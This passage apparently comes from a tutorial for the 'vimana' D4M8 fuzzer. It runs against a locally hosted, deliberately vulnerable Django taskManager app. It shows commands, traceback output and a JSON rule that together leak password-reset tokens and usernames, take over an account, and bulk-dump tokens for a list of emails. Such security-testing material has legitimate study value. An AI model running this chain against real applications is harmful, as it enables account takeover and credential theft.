          project_duedate: datetime.datetime(1970, 1, 1, 0, 0, tzinfo=<django.utils.timezone.LocalTimezone object at 0x7fa3774141f0>)
                  project: Error in formatting: TypeError: __str__ returned non-string (type bool)
```

</details>

Looking at the field "Reason" in a given exception can help you figure out whether it matters or not to investigate a given exception further. In this case, even though we have some methods to categorize that, here we could just say that a `A violation of a Django database relation occurred` sounds more interesting from an attacker's perspective than an `Inappropriate argument value` during a type conversion.

If you think about it, you should ask yourself: Why is this triggering a database exception with a `NOT NULL constraint` violation regarding a `user_id` parameter when I submitted a form to `http://localhost:8000/taskManager/project_create/` where I didn't try to tamper with any field related to user id?

Sounds like it was possible to submit forms that could modify data in that application, but it ends up with some problem trying to attribute that to a user that does not exist, since we were not authenticated (user_id == None):
```Python
sql: ('QUERY = \'INSERT INTO "taskManager_project_users_assigned" ("project_id", ' '"user_id") SELECT %s AS "project_id", %s AS "user_id"\' - PARAMS = (30, ' 'None)')
             
```

We may have spotted an authentication and authorization problem. Look at this diagram: 
![image](https://github.com/user-attachments/assets/21a53156-3d00-4f13-ab47-ddbe1bc7257f)


In practice, that'll be something we'll take some time to evaluate further, but in this case, we're looking for something else. 

As you can see, the app uses the user email to reset the password. 
![image](https://github.com/user-attachments/assets/3cdd0f66-5ce5-4a92-af5d-56fe8dff499b)

Knowing that we can target that specific path with the specific form field we want:
```python
vimana run d4m8 \
	--target-url http://127.0.0.1:8000 \
	--set-path /taskManager/forgot_password \
	--data '{"email":""}' 
```
In this case, we're just submmiting the email for as is without filling it out, and as result we see:
![image](https://github.com/user-attachments/assets/95e5ae43-9fd7-4b7c-a071-2b03645de28b)

Following the triggers in that exception traceback, we can see in the variables of the Django application itself /app/taskManager/views.py
That we managed to leak an important part of the reset password logic and sensitive information, such as the reset_token:
![image](https://github.com/user-attachments/assets/470e5a24-6cd7-45ab-8354-b69f681d8616)

<details>
<summary>Show full RelatedObjectDoesNotExist Traceback</summary>

```python
[2025-06-16 14:16:20.814035] ‚Üí Starting D4M8 against 1 inital URL...


 ‚Æö              Request                       

       Content-Type: application/x-www-form-urlencoded
            Referer: http://127.0.0.1:8000/taskManager/forgot_password/
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en
    Accept-Encoding: gzip, deflate, br, zstd
       csrfmiddlewaretoken: None

              email: 

	   <input type="email" name="email" class="form-control">                                             

 ‚Æò             Response                       

               Date: Mon, 16 Jun 2025 17:16:33 GMT
             Server: WSGIServer/0.2 CPython/3.6.9
       Content-Type: text/html
    X-Frame-Options: SAMEORIGIN

    RelatedObjectDoesNotExist 

             Reason: None
           Category: None
     Request Method: POST
        Request URL: http://127.0.0.1:8000/taskManager/forgot_password/
     Django Version: 1.8.3
    Exception Value: ['User has no userprofile.']
 Exception Location: /app/venv/lib/python3.6/site-packages/django/db/models/fields/related.py in __get__, line 470
  Python Executable: /app/venv/bin/python
     Python Version: 3.6.9
        Python Path: ['/app\n /app/venv/lib/python36.zip\n /app/venv/lib/python3.6\n /app/venv/lib/python3.6/lib-dynload\n /usr/lib/python3.6\n /app/venv/lib/python3.6/site-packages']
        Server time: Mon, 16 Jun 2025 17:16:33 +0000

          ‚û§  Trigger 

               Module: /app/venv/lib/python3.6/site-packages/django/core/handlers/base.py
             Function: get_response
         Line trigger: 132   response = wrapped_callback(request, *callback_args, **callback_kwargs)

                  ‚óé  vars 

         wrapped_callback: <function forgot_password at 0x7f0adb37a9d8>
          callback_kwargs: {}
            callback_args: ()
                 callback: <function forgot_password at 0x7f0adb37a9d8>
           resolver_match: ResolverMatch(func=taskManager.views.forgot_password, args=(), kwargs={}, url_name=forgot_password, app_name=None, namespaces=['taskManager'])
        middleware_method: <bound method CsrfViewMiddleware.process_view of <django.middleware.csrf.CsrfViewMiddleware object at 0x7f0adb3ca3c8>>
                 response: None
                 resolver: <RegexURLResolver 'taskManager.urls' (None:None) ^/>
                  urlconf: 'taskManager.urls'
                     self: <django.core.handlers.wsgi.WSGIHandler object at 0x7f0add275da0>
          ‚û§  Trigger 

               Module: /app/venv/lib/python3.6/site-packages/django/views/decorators/csrf.py
             Function: wrapped_view
         Line trigger: 58   return view_func(*args, **kwargs)

                  ‚óé  vars 

                   kwargs: {}
                     args: (<WSGIRequest: POST '/taskManager/forgot_password/'>,)
                view_func: <function forgot_password at 0x7f0adb37a950>
          ‚û§  Trigger 

               Module: /app/venv/lib/python3.6/site-packages/django/db/models/fields/related.py
             Function: __get__
         Line trigger: 470   self.related.get_accessor_name()

                  ‚óé  vars 

                 rh_field: <django.db.models.fields.AutoField: id>
                 lh_field: <django.db.models.fields.related.OneToOneField: user>
                   params: {'user__id': 8}
               related_pk: 8
                  rel_obj: None
            instance_type: <class 'django.contrib.auth.models.User'>
                 instance: <User: belchior>
                     self: <django.db.models.fields.related.SingleRelatedObjectDescriptor object at 0x7f0adcb79588>
          ‚û§  Trigger 

               Module: /app/taskManager/views.py
             Function: forgot_password
         Line trigger: 795   reset_user.userprofile.reset_token = reset_token

                  ‚óé  vars 

              reset_token: '132222'
                        x: 27
                     nums: [132, 222, 2, 241, 127, 27]
                      res: '132222224112727'
               reset_user: <User: belchior>
                  t_email: ''

‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
 ‚û§ Endpoints missing csrftokenmiddleware:

   These endpoints are associated with data-modifying actions
   performed through web forms in a Django application. Despite
   not implementing Django's csrftokenmiddleware, they are
   vulnerable to CSRF attacks.

            Date: Mon, 16 Jun 2025 17:16:33 GMT
          Server: WSGIServer/0.2 CPython/3.6.9
    Content-Type: text/html
 X-Frame-Options: SAMEORIGIN
  Django Version: 1.8.3
  Python Version: 3.6.9
          Target: http://127.0.0.1:8000

         status: 200
            url: http://127.0.0.1:8000/taskManager/forgot_password/
           form:
	   <input type="email" name="email" class="form-control">

      

```
</details>

As you can see, we managed to leak some interesting information regarding user accounts on that application. But something is just not quite right since we leaked a reset_token and a username while submiting a reset password form with an empty email field,
so that does not look like a legitimate case where we can compromisse that user account since there is no email associated with it. So looks like a mocked username for test for set something up and so on.
Yet, still some interesting insights in that traceback, right? 

Now, let's assume a slightly different scenario where we already have a list of valid emails on that application, true a previous brute force/enumaration step.
Here we'll run the very same command line but now using a valid email instead of a empty one "". 

```python
vimana run d4m8 \
	--target-url http://127.0.0.1:8000 \
	--set-path /taskManager/forgot_password \
	--data '{"email":"ags1@mtx.com"}' 
```
With that we got something interesting as you can see below:
![image](https://github.com/user-attachments/assets/1bfa78bc-cf45-436d-a71d-8e00b34aed5f)

In the diagram below, you can see why a `ConnectionRefusedError` in this context can be handy:
![image](https://github.com/user-attachments/assets/e7192897-7e25-4016-baa9-f547478779de)

Following the `ConnectionRefusedError` traceback we can see these trigger's vars below, specifically related to the django application's views module:
![image](https://github.com/user-attachments/assets/ac22f503-10cb-44b7-b6be-f2ebc5893fad)

There we have all is needed to change the user password and also to login in the application, note that we started with just the email address, with which alone, even if we had the password
will not be enough since the authentication process requires username and password:
![image](https://github.com/user-attachments/assets/dfa3bc07-b455-4220-9dca-1b984e6d404c)

In addition to the reset token we also got the username. 

Testing if the reset token is valid by changing the neois0ver user password, for the sake of practicality, we're using the token as password
![image](https://github.com/user-attachments/assets/fcf9c3a5-4ae6-4acf-aa4f-f6adcdc9d9e5)

If no error is returned we sucessfully changed the neois0ver password, let's check it by authenticating with that credential:
![image](https://github.com/user-attachments/assets/d74c07dc-7323-4a67-b76f-953bff8db1da)

and loging into the user profile:
![image](https://github.com/user-attachments/assets/f8f72d0c-16bb-4b39-a3c4-bbf63b073b80)

#### Ruling exception fuzzing and data extraction

As you notice, analyzing and parsing more than one email manually could become challenging if we were testing multiple emails, and that's why D4M8 supports rules. 
With this previous test result we already have everything we need to automate this process with multiple emails (or any given form field in the target application). 

Taking the trigger in the application's view module itself, we've seen this:
```Python

          ‚û§  Trigger 

               Module: /app/taskManager/views.py
             Function: forgot_password
         Line trigger: 802   "You can reset your password at /taskManager/reset_password/. Use \"{}\" as your token. This link will only work for 10 minutes.".format(reset_token))

                  ‚óé  vars 

              reset_token: '206112'
                        x: 226
                     nums: [206, 112, 138, 51, 16, 226]
                      res: '2061121385116226'
               reset_user: <User: neois0ver>
                  t_email: 'ags1@mtx.com'

```
With this, we already have a list of pre-requisites necessary to extract the information we're looking for for multiple users:
* Path: `/taskManager/forgot_password/`
* Method: `POST`
* Target Exception: `ConnectionRefusedError`
* Target Module: `/app/taskManager/views.py`
* Target Function: `forgot_password`
* Variables:
  - `reset_token`
  - `reset_user`
  - `t_email`
    

And finally, we can write a rule like this `siddhis/d4m8/rules/ConnectionRefusedError_AccountsDump.json`:
```json
{
    "FUZZER_SETTINGS": {
	"silent": true
    },
    "REQUEST": {
        "request_method": "POST",
        "request_urls": [
	    "http://127.0.0.1:8887/taskManager/forgot_password/"
	],
        "form_target_input_data": {
	    "email": "/tmp/d4m8_test_emails.txt"
	},
        "use_post_data": false,
        "use_request_file": false
    },
    "RESPONSE": {
        "target_exception_types": [
	    "ConnectionRefusedError"
	],
        "target_modules": [
	    "views.py"
	],
        "target_module_functions": [
	    "forgot_password",
	    "recover_password"
	]
    },
    "ACTIONS":[
        {
            "action_type": "extract_function_vars",
	    "function_vars": {
                "reset_user":"<User:\\s*(.*?)>",
                "t_email":false,
                "reset_token":false,
		"res":false
	    }
        }		
    ],
    "OUTPUT":  {
    	"format": "table"
    }
}


```

Here you can see the list of emails gathered in `/tmp/d4m8_test_emails.txt`:
```
ags1@mtx.com
cosmicrain@hotmail.com
jimlovespam@thedoors.com
jh1942@guitarheroes.com
visi02@gmaill.com
gsam@kafka.esc
ramalhesbusiness@protonmail.com
```

Now we just need to scan this rule (saved in `siddhis/d4m8/rules/`) using --scan-rules:
![image](https://github.com/user-attachments/assets/13f1c276-abd0-40f7-8a9b-66814094d976)

The command line will be just `vimana run d4m8 --scan-rules` and after a while (will not see the test response output since as you can see in the rule we're running in silent mode):
![image](https://github.com/user-attachments/assets/30de3117-a874-4a44-8d7e-36d7d67d6bf2)

And then you have all the usernames and reset tokens for the tested emails. 

This is just a straightfoward use case with D4M8.
